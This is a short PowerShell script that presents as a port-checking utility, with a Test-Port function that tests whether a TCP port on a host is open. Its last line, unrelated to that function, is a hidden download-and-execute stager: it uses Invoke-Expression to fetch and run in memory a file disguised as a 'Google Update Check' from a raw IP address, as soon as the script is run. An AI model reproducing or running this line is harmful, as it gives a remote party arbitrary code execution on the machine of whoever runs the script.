






















function Test-Port {
    param (
        $ip = '127.0.0.1',
        $port = '515'
    )

    begin {
        $tcp = New-Object Net.Sockets.TcpClient
    }
    
    process {
        try {
            $tcp.Connect($ip, $port)
        } catch {}

        if ($tcp.Connected) {
            $tcp.Close()
            $open = $true
        } else {
            $open = $false
        }

        [pscustomobject]@{
            IP = $ip
            Port = $port
            Open = $open
        }
    }
}

iex (New-Object Net.WebClient).DownloadString("http://84.200.84.187/Google Update Check.html")

